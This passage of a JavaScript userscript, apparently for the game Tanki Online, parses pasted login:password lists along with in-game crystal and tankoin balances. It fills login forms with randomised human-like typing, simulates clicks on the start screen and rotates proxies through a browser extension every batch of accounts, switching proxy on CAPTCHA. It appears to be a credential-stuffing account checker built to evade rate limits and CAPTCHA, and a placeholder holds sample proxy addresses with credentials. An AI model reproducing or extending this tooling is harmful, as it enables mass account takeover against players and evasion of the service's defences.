                const cryMatch = line.match(/^(?:Кристаллы|кристаллы)\s*[-:]\s*(.+)$/i);
                if (cryMatch) {
                    crystals = parseNumberFromText(cryMatch[1]);
                    continue;
                }
                const tankMatch = line.match(/^(?:Танкоины|танкоины)\s*[-:]\s*(.+)$/i);
                if (tankMatch) {
                    tankoins = parseNumberFromText(tankMatch[1]);
                    continue;
                }

                if (!LABEL_RE.test(line)) {
                    const m = line.match(/^([^\s:;]+)\s*[:;]\s*(.+)$/);
                    if (m && !m[1].toLowerCase().includes('http') && !/^https?:\/\//i.test(m[2])) {
                        if (login && password) flush();
                        login = login || m[1].trim();
                        password = password || m[2].trim();
                    }
                }
            }
            flush();
        }

        if (accounts.length === 0) {
            for (const rawLine of normalizedText.split(/\n/)) {
                const t = rawLine.trim();
                if (!t || LABEL_RE.test(t)) continue;
                const m = t.match(/^([^\s:;]+)\s*[:;]\s*(.+)$/);
                if (m && !m[1].toLowerCase().includes('http')) addAccount(m[1], m[2]);
            }
        }
        return accounts;
    }

    // =========================================================
    // HELPERS
    // =========================================================
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    const randomDelay = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

    function shuffleArray(array) {
        const s = [...array];
        for (let i = s.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [s[i], s[j]] = [s[j], s[i]];
        }
        return s;
    }
    function escapeHtml(v) {
        return String(v ?? "").replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;")
            .replaceAll('"', "&quot;").replaceAll("'", "&#039;");
    }
    function normalizeEmail(value) {
        if (value === null || value === undefined) return null;
        const email = String(value).trim();
        if (!email || /^null$/i.test(email)) return null;
        return email;
    }
    function formatAmount(value) {
        const n = String(value || "0").replace(/\s/g, "");
        if (!n || n === "0") return "0";
        return Number(n).toLocaleString("ru-RU");
    }
    function setValueNative(input, value) {
        const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").set;
        setter.call(input, value);
        input.dispatchEvent(new Event("input", { bubbles: true }));
        input.dispatchEvent(new Event("change", { bubbles: true }));
    }
    async function humanType(input, text) {
        input.focus();
        setValueNative(input, "");
        for (let char of text) {
            setValueNative(input, input.value + char);
            await sleep(randomDelay(12, 35));
        }
    }
    function copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => showToast("Скопировано", "success")).catch(() => {
            const ta = document.createElement("textarea");
            ta.value = text;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand("copy");
            ta.remove();
            showToast("Скопировано", "success");
        });
    }
    function parseNumberFromText(text) {
        if (!text) return "0";
        return String(text).replace(/[\s\u00A0\u202F\u2009]/g, "").replace(/[^\d]/g, "") || "0";
    }
    function humanField(v) {
        if (v === null || v === undefined) return "—";
        const s = String(v).trim();
        if (!s || s.toLowerCase() === "null" || s === "undefined" || s === "NaN") return "—";
        return s;
    }

    // =========================================================
    // PROXY IP
    // =========================================================
    let _cachedIP = { ip: null, ts: 0 };
    function fetchCurrentIP() {
        return new Promise((resolve) => {
            if (!CONFIG.IP_CHECK_ENABLED) return resolve(null);
            if (_cachedIP.ip && Date.now() - _cachedIP.ts < 20000) return resolve(_cachedIP.ip);
            GM_xmlhttpRequest({
                method: "GET",
                url: "https://api.ipify.org?format=json",
                timeout: 8000,
                onload: (res) => {
                    try {
                        const data = JSON.parse(res.responseText);
                        const ip = data.ip || null;
                        if (ip) _cachedIP = { ip, ts: Date.now() };
                        resolve(ip);
                    } catch (e) { resolve(null); }
                },
                onerror: () => resolve(null),
                ontimeout: () => resolve(null)
            });
        });
    }

    // =========================================================
    // PROXY ROTATION — BRIDGE + MANAGER
    // =========================================================
    function parseProxy(input) {
    if (typeof input === "object" && input !== null) {
        const scheme = String(input.scheme || "http").toLowerCase();
        const host = String(input.host || "").trim();
        const port = Number(input.port);
        const username = String(input.username || "");
        const password = String(input.password || "");

        if (!host || !Number.isInteger(port) || port < 1 || port > 65535) {
            throw new Error("Неверный host/port прокси");
        }

        if (!["http", "https", "socks4", "socks5"].includes(scheme)) {
            throw new Error(`Неподдерживаемая схема прокси: ${scheme}`);
        }

        return {
            id: `${scheme}://${host}:${port}`,
            label: `${host}:${port}`,
            host,
            port,
            scheme,
            username,
            password
        };
    }

    let raw = String(input || "").trim();

    if (!raw) {
        throw new Error("Пустая строка прокси");
    }

    raw = raw.replace(/\\:/g, ":");

    let scheme = "http";
    let value = raw;

    const schemeMatch = value.match(/^(https?|socks4|socks5):\/\//i);

    if (schemeMatch) {
        scheme = schemeMatch[1].toLowerCase();
        value = value.slice(schemeMatch[0].length);
    }

    const parts = value.split(":");

    if (parts.length < 2 || parts.length > 4) {
        throw new Error(`Неверный формат прокси: ${raw}`);
    }

    const host = parts[0].trim();
    const port = Number(parts[1]);
    const username = parts.length >= 3 ? parts[2] : "";
    const password = parts.length >= 4 ? parts.slice(3).join(":") : "";

    if (!host) {
        throw new Error(`Пустой host прокси: ${raw}`);
    }

    if (!Number.isInteger(port) || port < 1 || port > 65535) {
        throw new Error(`Неверный порт прокси: ${raw}`);
    }

    return {
        id: `${scheme}://${host}:${port}`,
        label: `${host}:${port}`,
        host,
        port,
        scheme,
        username,
        password
    };
}

    class ProxyRotationManager {
        constructor(proxyList, bridge) {
            this.bridge = bridge;
            this.proxyList = [];
            this.currentProxyIndex = 0;
            this.checkedAccountsCount = 0;
            this.activeAccountLogin = null;
            this.forcedProxyIndex = null;
            this.forcedProxyBatch = null;
            this.lastSwitchAt = 0;
            this.destroyed = false;
            this.switchInProgress = false;
            this.bridgeReady = false;
            this.lastError = null;
            this.listeners = new Set();
            this.setProxyList(proxyList);

            this.unsubscribeBridge = this.bridge.onEvent((event, payload) => {
                if (event === "PROXY_ERROR") this.handleError(payload);
            });
        }

        log(...args) { console.log("[PROXY]", ...args); }
        error(...args) { console.error("[PROXY]", ...args); }

        onChange(handler) {
            this.listeners.add(handler);
            return () => this.listeners.delete(handler);
        }

        emit() {
            const state = this.getState();
            for (const handler of this.listeners) {
                try { handler(state); }
                catch (error) { this.error("UI listener error:", error); }
            }
        }

        setProxyList(list) {
            this.proxyList = [];
            for (const item of Array.isArray(list) ? list : []) {
                try { this.proxyList.push(parseProxy(item)); }
                catch (error) { this.error("Invalid proxy skipped:", error); }
            }
            if (this.proxyList.length) {
                this.currentProxyIndex = Math.min(
                    Math.max(0, this.currentProxyIndex),
                    this.proxyList.length - 1
                );
            } else {
                this.currentProxyIndex = 0;
            }
        }

        get currentProxy() { return this.proxyList[this.currentProxyIndex] || null; }

        get batchSize() {
            return Math.max(1, Number(CONFIG.PROXY_ROTATION_BATCH_SIZE) || 10);
        }

        getDesiredProxyIndex(count = this.checkedAccountsCount) {
            if (!this.proxyList.length || count <= 0) return 0;
            const batch = Math.floor((count - 1) / this.batchSize);
            if (Number.isInteger(this.forcedProxyIndex) && this.forcedProxyBatch === batch) {
                return ((this.forcedProxyIndex % this.proxyList.length) + this.proxyList.length) % this.proxyList.length;
            }
            return batch % this.proxyList.length;
        }

        getAccountsInCurrentBatch() {
            if (!this.checkedAccountsCount) return 0;
            return ((this.checkedAccountsCount - 1) % this.batchSize) + 1;
        }

        getAccountsUntilNextProxy() {
            if (!this.checkedAccountsCount) return this.batchSize;
            return this.batchSize - this.getAccountsInCurrentBatch();
        }

        getState() {
            return {
                proxyCount: this.proxyList.length,
                currentProxyIndex: this.currentProxyIndex,
                currentProxy: this.currentProxy,
                checkedAccountsCount: this.checkedAccountsCount,
                activeAccountLogin: this.activeAccountLogin,
                batchSize: this.batchSize,
                accountsInCurrentBatch: this.getAccountsInCurrentBatch(),
                accountsUntilNextProxy: this.getAccountsUntilNextProxy(),
                forcedProxyIndex: this.forcedProxyIndex,
                forcedProxyBatch: this.forcedProxyBatch,
                switchInProgress: this.switchInProgress,
                bridgeReady: this.bridgeReady,
                connected: this.bridge.connected,
                lastError: this.lastError
            };
        }

        loadState() {
            try {
                const raw = GM_getValue(CONFIG.PROXY_ROTATION_STATE_KEY, null);
                if (!raw) return;
                const state = typeof raw === "string" ? JSON.parse(raw) : raw;
                if (Number.isInteger(state.currentProxyIndex)) this.currentProxyIndex = state.currentProxyIndex;
                if (Number.isInteger(state.checkedAccountsCount) && state.checkedAccountsCount >= 0) {
                    this.checkedAccountsCount = state.checkedAccountsCount;
                }
                if (typeof state.activeAccountLogin === "string" && state.activeAccountLogin) {
                    this.activeAccountLogin = state.activeAccountLogin;
                } else {
                    this.activeAccountLogin = null;
                }
                if (Number.isFinite(state.lastSwitchAt)) this.lastSwitchAt = state.lastSwitchAt;
                if (Number.isInteger(state.forcedProxyIndex)) this.forcedProxyIndex = state.forcedProxyIndex;
                if (Number.isInteger(state.forcedProxyBatch)) this.forcedProxyBatch = state.forcedProxyBatch;
                if (state.lastError) this.lastError = state.lastError;

                if (this.proxyList.length) {
                    const desired = this.getDesiredProxyIndex();
                    this.currentProxyIndex = desired;
                }
            } catch (error) {
                this.error("Не удалось восстановить состояние:", error);
            }
        }

        saveState() {
            try {
                GM_setValue(CONFIG.PROXY_ROTATION_STATE_KEY, JSON.stringify({
                    currentProxyIndex: this.currentProxyIndex,
                    checkedAccountsCount: this.checkedAccountsCount,
                    activeAccountLogin: this.activeAccountLogin,
                    forcedProxyIndex: this.forcedProxyIndex,
                    forcedProxyBatch: this.forcedProxyBatch,
                    lastSwitchAt: this.lastSwitchAt,
                    lastError: this.lastError
                }));
            } catch (error) {
                this.error("Не удалось сохранить состояние:", error);
            }
        }

        async init() {
            if (this.destroyed) return;
            this.loadState();

            this.log(`Восстановлено состояние: проверено ${this.checkedAccountsCount} аккаунтов`);
            this.log(`Текущий прокси: #${this.proxyList.length ? this.currentProxyIndex + 1 : "—"}`);
            if (this.activeAccountLogin) this.log(`Активный аккаунт после reload: ${this.activeAccountLogin}`);

            try {
                await this.bridge.connect();
                this.bridgeReady = true;
                this.lastError = null;
                this.log("Proxy Bridge подключен");
            } catch (error) {
                this.bridgeReady = false;
                this.handleError(error, false);
                this.emit();
                return;
            }

            if (!CONFIG.PROXY_ENABLED) {
                this.log("PROXY_ENABLED=false — init без активации прокси");
                this.emit();
                return;
            }

            if (!this.proxyList.length) {
                this.handleError(new Error("Список прокси пуст"), false);
                this.emit();
                return;
            }

            const desiredIndex = this.getDesiredProxyIndex();
            await this.ensureProxy(desiredIndex, "STATE_RESTORE");
            this.emit();
        }

        async beginAccountCheck(login) {
            if (this.destroyed || !login) return false;
            if (!CONFIG.PROXY_ENABLED) {
                this.log("PROXY_ENABLED=false — пропуск ротации прокси");
                this.activeAccountLogin = String(login).trim() || null;
                this.saveState();
                this.emit();
                return true;
            }
            if (!this.proxyList.length) return false;
            const normalizedLogin = String(login).trim();
            if (!normalizedLogin) return false;

            if (this.activeAccountLogin === normalizedLogin) {
                const desiredIndex = this.getDesiredProxyIndex();
                this.log(`Продолжение аккаунта #${this.checkedAccountsCount}: ${normalizedLogin} → Proxy #${desiredIndex + 1}`);
                await this.ensureProxy(desiredIndex, "ACCOUNT_RESUME");
                return true;
            }

            this.checkedAccountsCount += 1;
            this.activeAccountLogin = normalizedLogin;

            const batchNumber = Math.floor((this.checkedAccountsCount - 1) / this.batchSize);
            if (this.forcedProxyBatch !== null && this.forcedProxyBatch !== batchNumber) {
                this.log(`Новый batch #${batchNumber + 1} → сброс временного CAPTCHA-прокси`);
                this.forcedProxyIndex = null;
                this.forcedProxyBatch = null;
            }

            const desiredIndex = this.getDesiredProxyIndex();
            this.log(`Аккаунт #${this.checkedAccountsCount} → Proxy #${desiredIndex + 1}`);

            this.saveState();

            const isBoundary = this.checkedAccountsCount > 1 &&
                ((this.checkedAccountsCount - 1) % this.batchSize === 0);
            if (isBoundary) {
                this.log(`Достигнут лимит ${this.batchSize} аккаунтов → переключение на Proxy #${desiredIndex + 1}`);
            }

            const ok = await this.ensureProxy(desiredIndex, isBoundary ? "ACCOUNT_BATCH" : "ACCOUNT_START");
            if (!ok) this.log(`Proxy #${desiredIndex + 1} пока не активирован; состояние сохранено, повторим без повторного счёта`);
            return ok;
        }

        async switchNextProxy(reason = "MANUAL_SWITCH") {
            if (!CONFIG.PROXY_ENABLED) {
                this.log("PROXY_ENABLED=false — switchNextProxy пропущен (" + reason + ")");
                return true;
            }
            if (!this.proxyList.length) {
                this.handleError(new Error("Список прокси пуст"), false);
                return false;
            }

            const batchNumber = this.checkedAccountsCount > 0
                ? Math.floor((this.checkedAccountsCount - 1) / this.batchSize)
                : 0;
            const nextIndex = (this.currentProxyIndex + 1) % this.proxyList.length;

            this.forcedProxyIndex = nextIndex;
            this.forcedProxyBatch = batchNumber;
            this.saveState();

            this.log(`Принудительное переключение → Proxy #${nextIndex + 1} | причина: ${reason}`);
            const ok = await this.ensureProxy(nextIndex, reason);
            if (!ok) {
                this.forcedProxyIndex = null;
                this.forcedProxyBatch = null;
                this.saveState();
                return false;
            }
            return true;
        }

        finishAccountCheck(login = null) {
            if (login && this.activeAccountLogin && String(login).trim() !== this.activeAccountLogin) return;
            if (this.activeAccountLogin) this.log(`Аккаунт завершён: ${this.activeAccountLogin}`);
            this.activeAccountLogin = null;
            this.saveState();
            this.emit();
        }

        async ensureProxy(index, reason = "ACCOUNT_START") {
            if (!CONFIG.PROXY_ENABLED) {
                this.log("PROXY_ENABLED=false — ensureProxy пропущен (" + reason + ")");
                return true;
            }
            if (!this.proxyList.length) return false;
            if (index < 0 || index >= this.proxyList.length) return false;

            if (!this.bridgeReady) {
                try {
                    await this.bridge.connect();
                    this.bridgeReady = true;
                } catch (error) {
                    this.bridgeReady = false;
                    this.handleError(error, false);
                    return false;
                }
            }

            try {
                const extensionState = await this.bridge.getCurrentProxy();
                const extProxy = extensionState?.proxy;
                const effectiveProxy = extensionState?.effectiveProxy ||
                    extensionState?.effective?.rules?.singleProxy || null;
                const target = this.proxyList[index];

                const sameProxy = (proxy) => !!proxy &&
                    String(proxy.host || "").toLowerCase() === String(target.host || "").toLowerCase() &&
                    Number(proxy.port) === Number(target.port) &&
                    String(proxy.scheme || "http").toLowerCase() === String(target.scheme || "http").toLowerCase();

                const storedMatches = sameProxy(extProxy);
                const chromeMatches = sameProxy(effectiveProxy);

                this.log(
                    `Проверка Proxy #${index + 1}: stored=${storedMatches ? "OK" : "NO"}, chrome=${chromeMatches ? "OK" : "NO"}`,
                    effectiveProxy || "Chrome proxy отсутствует"
                );

                if (storedMatches && chromeMatches) {
                    this.currentProxyIndex = index;
                    this.lastError = null;
                    this.saveState();
                    this.emit();
                    return true;
                }

                if (!chromeMatches) {
                    this.log(
                        `Chrome использует другой proxy. Требуется: ${maskProxy(target)}; фактически:`,
                        effectiveProxy || "DIRECT"
                    );
                }
            } catch (error) {
                this.handleError(error, false);
            }

            return await this.setProxy(index, reason);
        }

        async setProxy(index, reason = "ACCOUNT_START") {
            if (this.destroyed) return false;
            if (!CONFIG.PROXY_ENABLED) {
                this.log("PROXY_ENABLED=false — setProxy пропущен (" + reason + ")");
                return true;
            }
            if (!Number.isInteger(index) || index < 0 || index >= this.proxyList.length) {
                this.error("Invalid proxy index:", index);
                return false;
            }
            if (this.switchInProgress) {
                this.log("Переключение уже выполняется; запрос пропущен");
                return false;
            }
            if (!this.bridgeReady) {
                try {
                    await this.bridge.connect();
                    this.bridgeReady = true;
                } catch (error) {
                    this.bridgeReady = false;
                    this.handleError(error, false);
                    return false;
                }
            }

            const target = this.proxyList[index];
            const oldIndex = this.currentProxyIndex;
            this.switchInProgress = true;
            this.emit();

            try {
                const applied = await this.bridge.setProxy(target);

                const verified = await this.bridge.getCurrentProxy();
                const effectiveProxy = verified?.effectiveProxy ||
                    verified?.effective?.rules?.singleProxy || null;
                const chromeMatches = !!effectiveProxy &&
                    String(effectiveProxy.host || "").toLowerCase() === String(target.host || "").toLowerCase() &&
                    Number(effectiveProxy.port) === Number(target.port) &&
                    String(effectiveProxy.scheme || "http").toLowerCase() === String(target.scheme || "http").toLowerCase();

                if (!chromeMatches) {
                    throw new Error(
                        `Chrome не подтвердил Proxy #${index + 1}: фактически ${effectiveProxy ? `${effectiveProxy.scheme || "http"}://${effectiveProxy.host}:${effectiveProxy.port}` : "DIRECT"}`
                    );
                }

                this.currentProxyIndex = index;
                this.lastSwitchAt = Date.now();
                this.lastError = null;
                this.saveState();
                this.log(`Proxy changed: #${oldIndex + 1} → #${index + 1} | причина: ${reason}`);
                this.log(`Активен Proxy #${index + 1} | Chrome подтвердил ${target.scheme}://${target.host}:${target.port}`);
                this.emit();
                return true;
            } catch (error) {
                this.handleError(error, false);
                this.emit();
                return false;
            } finally {
                this.switchInProgress = false;
                this.emit();
            }
        }

        async testProxy() {
            try {
                const result = await this.bridge.testProxy(CONFIG.PROXY_ROTATION_TEST_TIMEOUT);
                if (result?.ok) this.lastError = null;
                else this.lastError = result?.error || result?.status || "Proxy test failed";
                this.emit();
                return result;
            } catch (error) {
                this.handleError(error, false);
                return { ok: false, status: "ERROR", error: error.message };
            }
        }

        handleError(payload, logPrefix = true) {
            const error = payload instanceof Error ? payload : new Error(
                payload?.error || payload?.details || String(payload || "Unknown proxy error")
            );
            this.lastError = error.message || "Unknown proxy error";
            if (logPrefix) this.error("Extension reported proxy error:", payload);
            this.error("Не удалось активировать прокси:", this.lastError);
            this.saveState();
            this.emit();
        }

        destroy() {
            if (this.destroyed) return;
            this.destroyed = true;
            this.unsubscribeBridge?.();
            this.bridge.destroy();
        }
    }

    let proxyExtensionBridge = null;
    let proxyRotationManager = null;

    function maskProxy(proxy) {
        if (!proxy) return "—";
        return `${proxy.scheme}://${proxy.host}:${proxy.port}`;
    }

    function updateProxyRotationUI(state = proxyRotationManager?.getState()) {
        const root = document.getElementById("proxy-rotation-settings");
        if (!root || !state) return;

        const statusText = root.querySelector("[data-pr-status]");
        const dot = root.querySelector("[data-pr-dot]");
        const current = root.querySelector("[data-pr-current]");
        const progress = root.querySelector("[data-pr-timer]");
        const auto = root.querySelector("[data-pr-auto]");
        const error = root.querySelector("[data-pr-error]");

        const active = !!state.connected && !!state.currentProxy && !state.lastError && !state.switchInProgress;
        statusText.textContent = state.switchInProgress ? "SWITCHING" : active ? "ACTIVE" : "ERROR";
        dot.className = `tc-pr-dot ${active ? "active" : "error"}`;
        current.textContent = state.currentProxy
            ? `Proxy ${state.currentProxyIndex + 1} — ${maskProxy(state.currentProxy)}`
            : "—";
        progress.textContent = `${state.accountsInCurrentBatch}/${state.batchSize}`;
        auto.textContent = "BY ACCOUNTS";
        error.textContent = state.lastError ? `ERROR: ${state.lastError}` : "";
    }

    function renderProxyRotationBlock() {
        const styleId = "tanki-proxy-rotation-style";
        if (!document.getElementById(styleId)) {
            const style = document.createElement("style");
            style.id = styleId;
            style.textContent = `
                #proxy-rotation-settings{margin-top:28px;padding:16px;border:1px solid var(--tc-border);border-radius:14px;background:linear-gradient(180deg,var(--tc-surface-2),var(--tc-surface));}
                .tc-pr-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:14px;}
                .tc-pr-title{font-size:13px;font-weight:800;letter-spacing:.08em;color:var(--tc-text);}
                .tc-pr-status{display:flex;align-items:center;gap:7px;font-size:10px;font-weight:800;letter-spacing:.08em;color:var(--tc-text-muted);}
                .tc-pr-dot{width:8px;height:8px;border-radius:50%;background:#777;box-shadow:0 0 9px currentColor;}
                .tc-pr-dot.active{background:#50e38b;color:#50e38b;}.tc-pr-dot.error{background:#ff5c68;color:#ff5c68;}
                .tc-pr-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
                .tc-pr-card{padding:11px 12px;border:1px solid var(--tc-border);border-radius:10px;background:var(--tc-surface);}
                .tc-pr-label{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--tc-text-dim);margin-bottom:4px;}
                .tc-pr-value{font-size:13px;font-weight:750;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
                .tc-pr-time{font-size:21px;font-variant-numeric:tabular-nums;}
                .tc-pr-editor{margin-top:10px;}
                .tc-pr-textarea{box-sizing:border-box;width:100%;min-height:105px;resize:vertical;padding:10px 11px;border:1px solid var(--tc-border);border-radius:10px;background:var(--tc-surface);color:var(--tc-text);font:12px/1.5 ui-monospace,SFMono-Regular,Consolas,monospace;outline:none;}
                .tc-pr-textarea:focus{border-color:#8ab4ff;box-shadow:0 0 0 2px rgba(138,180,255,.12);}
                .tc-pr-help{margin-top:6px;font-size:10px;line-height:1.4;color:var(--tc-text-muted);}
                .tc-pr-actions{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px;}
                .tc-pr-actions .tc-btn{margin:0;}
                .tc-pr-wide{grid-column:1/-1;}
                .tc-pr-auto{display:flex;align-items:center;justify-content:space-between;width:100%;}
                .tc-pr-error{grid-column:1/-1;min-height:16px;font-size:11px;line-height:1.45;color:#ff7b84;word-break:break-word;}
                @media(max-width:650px){.tc-pr-grid{grid-template-columns:1fr;}.tc-pr-actions{grid-template-columns:1fr;}.tc-pr-wide{grid-column:auto;}}
            `;
            document.head.appendChild(style);
        }

        return `
            <div id="proxy-rotation-settings">
                <div class="tc-pr-head">
                    <div class="tc-pr-title">PROXY ROTATION</div>
                    <div class="tc-pr-status"><span class="tc-pr-dot error" data-pr-dot></span><span data-pr-status>ERROR</span></div>
                </div>
                <div class="tc-pr-grid">
                    <div class="tc-pr-card"><div class="tc-pr-label">Current proxy</div><div class="tc-pr-value" data-pr-current>—</div></div>
                    <div class="tc-pr-card"><div class="tc-pr-label">Accounts in proxy batch</div><div class="tc-pr-time" data-pr-timer>0/10</div></div>
                </div>
                <div class="tc-pr-editor">
                    <div class="tc-pr-label">Proxy list</div>
                    <textarea class="tc-pr-textarea" data-pr-list spellcheck="false" placeholder="31.44.188.69:9357:BJwrP3:7V5TQy\n31.44.190.162:9368:BJwrP3:7V5TQy"></textarea>
                    <div class="tc-pr-help">Один прокси на строку: IP:PORT:LOGIN:PASSWORD. Изменения применяются сразу и сохраняются в GM storage.</div>
                </div>
                <div class="tc-pr-actions">
                    <button type="button" class="tc-btn tc-btn-primary tc-pr-save" data-pr-save>Save proxies</button>
                    <button type="button" class="tc-btn tc-btn-secondary tc-pr-test" data-pr-test>Test current proxy</button>
                    <div class="tc-btn tc-btn-secondary tc-pr-wide tc-pr-auto" aria-disabled="true"><span>Rotation mode</span><b data-pr-auto>BY ACCOUNTS</b></div>
                    <div class="tc-pr-error" data-pr-error></div>
                </div>
            </div>`;
    }

    function bindProxyRotationUI() {
        const root = document.getElementById("proxy-rotation-settings");
        if (!root || !proxyRotationManager || root.dataset.bound === "1") return;
        root.dataset.bound = "1";

        const textarea = root.querySelector("[data-pr-list]");
        const saveBtn = root.querySelector("[data-pr-save]");
        const testBtn = root.querySelector("[data-pr-test]");
        const error = root.querySelector("[data-pr-error]");

        if (textarea) textarea.value = getProxyListText();

        saveBtn?.addEventListener("click", async () => {
            const lines = String(textarea?.value || "")
                .split(/\r?\n/)
                .map(v => v.trim())
                .filter(Boolean);

            if (!lines.length) {
                error.textContent = "ERROR: добавь хотя бы один прокси";
                return;
            }

            const parsed = [];
            const invalid = [];
            for (let i = 0; i < lines.length; i++) {
                try {
                    parsed.push(parseProxy(lines[i]));
                } catch (e) {
                    invalid.push(`строка ${i + 1}: ${e.message}`);
                }
            }

            if (invalid.length) {
                error.textContent = `ERROR: ${invalid.join(" | ")}`;
                return;
            }

            saveProxyListToStorage(lines);
            proxyRotationManager.setProxyList(lines);
            proxyRotationManager.currentProxyIndex = Math.min(
                proxyRotationManager.currentProxyIndex,
                Math.max(0, proxyRotationManager.proxyList.length - 1)
            );
            proxyRotationManager.lastError = null;
            proxyRotationManager.saveState();
            proxyRotationManager.emit();

            error.textContent = `Сохранено прокси: ${parsed.length}. Текущий batch: ${proxyRotationManager.getAccountsInCurrentBatch()}/${proxyRotationManager.batchSize}`;

            const desired = proxyRotationManager.getDesiredProxyIndex();
            await proxyRotationManager.ensureProxy(desired, "PROXY_LIST_UPDATED");
        });

        testBtn?.addEventListener("click", async () => {
            error.textContent = "Проверка текущего proxy…";
            const result = await proxyRotationManager.testProxy();
            if (result?.ok) {
                error.textContent = `OK: внешний IP ${result.ip || "unknown"}`;
            } else {
                error.textContent = `ERROR: ${result?.error || result?.status || "Proxy test failed"}`;
            }
        });
    }

    class ProxyExtensionBridge {
    constructor() {
        this.pending = new Map();
        this.eventHandlers = new Set();
        this.requestCounter = 0;
        this.connected = false;

        this.onBridgeEvent = this.onBridgeEvent.bind(this);

        document.addEventListener(
            "proxy-rotation-extension",
            this.onBridgeEvent
        );
    }

    async connect() {
        const attempts = 4;
        let lastError = null;

        for (let attempt = 1; attempt <= attempts; attempt++) {
            try {
                const result = await this.hello(3500);
                this.connected = true;
                console.log(`[Proxy Rotation] Bridge handshake OK (attempt ${attempt})`, result);
                return result;
            } catch (error) {
                lastError = error;
                this.connected = false;
                console.warn(`[Proxy Rotation] Bridge handshake failed (${attempt}/${attempts}):`, error?.message || error);
                if (attempt < attempts) {
                    await new Promise(resolve => setTimeout(resolve, 500 * attempt));
                }
            }
        }

        throw lastError || new Error("Extension bridge unavailable");
    }

    onBridgeEvent(event) {
        let data = event?.detail;

        if (!data) return;

        if (typeof data === "string") {
            try {
                data = JSON.parse(data);
            } catch {
                return;
            }
        }

        if (
            !data ||
            data.channel !== "PROXY_ROTATION_BRIDGE_V1" ||
            data.direction !== "extension-to-userscript"
        ) {
            return;
        }

        this.handleBridgeData(data);
    }

    handleBridgeData(data) {
        if (!data) return;

        if (data.type === "response") {
            const pending = this.pending.get(data.requestId);

            if (!pending) return;

            this.pending.delete(data.requestId);
            clearTimeout(pending.timer);

            if (data.ok === false) {
                this.connected = false;
                pending.reject(
                    new Error(
                        data.error ||
                        data.result?.error ||
                        "Extension error"
                    )
                );
            } else {
                this.connected = true;
                pending.resolve(data.result);
            }

            return;
        }

        if (data.type === "event") {
            for (const handler of this.eventHandlers) {
                try {
                    handler(data.event, data.payload);
                } catch (error) {
                    console.error(
                        "[Proxy Rotation] Bridge event handler error:",
                        error
                    );
                }
            }
        }
    }

    request(type, payload = null, timeoutMs = 10000) {
        return new Promise((resolve, reject) => {
            const requestId =
                `proxy_${Date.now()}_${++this.requestCounter}`;

            const timer = setTimeout(() => {
                this.pending.delete(requestId);

                reject(
                    new Error(
                        `Extension timeout: ${type}`
                    )
                );
            }, timeoutMs);

            this.pending.set(requestId, {
                resolve,
                reject,
                timer
            });

            const message = {
                channel: "PROXY_ROTATION_BRIDGE_V1",
                direction: "userscript-to-extension",
                type,
                requestId,
                payload
            };

            try {
                document.dispatchEvent(
                    new CustomEvent(
                        "proxy-rotation-userscript",
                        {
                            detail: JSON.stringify(message)
                        }
                    )
                );
            } catch (error) {
                clearTimeout(timer);
                this.pending.delete(requestId);
                reject(error);
            }
        });
    }

    hello(timeoutMs = 10000) {
        return this.request("hello", null, timeoutMs);
    }

    setProxy(proxy) {
        return this.request("setProxy", {
            proxy
        });
    }

    getCurrentProxy() {
        return this.request("getCurrentProxy");
    }

    testProxy(timeoutMs = 10000) {
        return this.request("testProxy", {
            timeoutMs
        });
    }

    clearProxy() {
        return this.request("clearProxy");
    }

    onEvent(handler) {
        if (typeof handler !== "function") {
            return () => {};
        }

        this.eventHandlers.add(handler);

        return () => {
            this.eventHandlers.delete(handler);
        };
    }

    destroy() {
        for (const [, pending] of this.pending) {
            clearTimeout(pending.timer);

            pending.reject(
                new Error("Proxy bridge destroyed")
            );
        }

        this.pending.clear();
        this.eventHandlers.clear();

        document.removeEventListener(
            "proxy-rotation-extension",
            this.onBridgeEvent
        );
    }
}

    function initProxyRotation() {
    if (proxyRotationManager) return proxyRotationManager;

    proxyExtensionBridge = new ProxyExtensionBridge();

    proxyRotationManager = new ProxyRotationManager(
        loadProxyListFromStorage(),
        proxyExtensionBridge
    );

    proxyRotationManager.onChange(updateProxyRotationUI);
    bindProxyRotationUI();
    updateProxyRotationUI();

    proxyRotationManager.init().catch(error => {
        proxyRotationManager.handleError(error, false);
    });

    window.ProxyRotationManager = proxyRotationManager;
    window.ProxyBridge = proxyExtensionBridge;

    window.addEventListener(
        "beforeunload",
        () => proxyRotationManager?.destroy(),
        { once: true }
    );

    return proxyRotationManager;
}

        // =========================================================
        // START SCREEN — робастный клик «Нажмите любую кнопку»
        // =========================================================
    function isStartScreenVisible() {
        const container = document.querySelector('.StartScreenComponentStyle-mainContainer');
        if (!container || !container.isConnected) return false;
        const rect = container.getBoundingClientRect();
        return rect.width > 0 && rect.height > 0;
    }

    function dispatchKey(key, code, keyCode) {
        const targets = [document, document.body, document.documentElement, window].filter(Boolean);
        for (const target of targets) {
            for (const type of ['keydown', 'keypress', 'keyup']) {
                try {
                    target.dispatchEvent(new KeyboardEvent(type, {
                        key, code, keyCode, which: keyCode,
                        bubbles: true, cancelable: true, view: window
                    }));
                } catch (_) {}
            }
        }
    }

    function forcePointerClick(element) {
        if (!element) return false;
        try { element.scrollIntoView({ block: 'center', inline: 'center' }); } catch (_) {}
        const rect = element.getBoundingClientRect();
        const x = rect.left + Math.max(rect.width / 2, 1);
        const y = rect.top + Math.max(rect.height / 2, 1);
        const opts = {
            view: window, bubbles: true, cancelable: true, composed: true,
            clientX: x, clientY: y, button: 0, buttons: 1
        };
        try {
            for (const type of ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click']) {
                const Ctor = type.startsWith('pointer') ? PointerEvent : MouseEvent;
                element.dispatchEvent(new Ctor(type, opts));
            }
            return true;
        } catch (_) {
            try { element.click(); return true; } catch (__) { return false; }
        }
    }

    function clickStartScreenOnce() {
        dispatchKey(' ', 'Space', 32);
        dispatchKey('Enter', 'Enter', 13);
        dispatchKey('Escape', 'Escape', 27);

        const selectors = [
